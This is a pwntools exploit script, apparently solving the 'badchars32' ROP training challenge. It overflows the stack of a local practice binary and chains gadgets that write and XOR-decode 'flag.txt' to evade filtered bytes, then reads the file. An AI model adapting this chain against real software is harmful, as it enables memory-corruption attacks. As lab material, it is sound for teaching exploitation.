from pwn import *

sh = process('./badchars32')

pop_esi_edi_ebp = 0x080485b9
mov_addr_edi_esi = 0x0804854f
pop_ebp = 0x080485bb
pop_ebx = 0x0804839d
print_file = 0x080483d0
xor_ebp_bl = 0x08048547

data_addr = 0x0804a018

flag_txt = "flag.txt"

# encode
badchars = ['x','g','a','.']
xor_byte = 0x1
while 1:
    flag = ""
    index = []
    i = 0
    for f in flag_txt:
         if (f in badchars):
             c = ord(f)^xor_byte
             if chr(c) in badchars:
                xor_byte += 1
                break
             else:
                index.append(flag_txt.index(f))
                flag += chr(c)
         else:
            flag += f
    if len(flag) == 8:
        break
print(flag)
print(index)

# write
write_flag = p32(pop_esi_edi_ebp) + flag[:4].encode() + p32(data_addr) + p32(0x0) + p32(mov_addr_edi_esi)
write_flag += p32(pop_esi_edi_ebp) + flag[4:8].encode() + p32(data_addr+4) + p32(0x0) + p32(mov_addr_edi_esi)

# decode
for i in index:
    write_flag += p32(pop_ebp) 
    write_flag += p32(data_addr+i)
    write_flag += p32(pop_ebx)
    write_flag += p32(xor_byte)
    write_flag += p32(xor_ebp_bl)

payload = b'a'*40 + p32(0xdeadbeef) + write_flag + p32(print_file) + p32(0xdeadbeef) + p32(data_addr)


print(payload)
sh.sendline(payload)
sh.interactive()
 

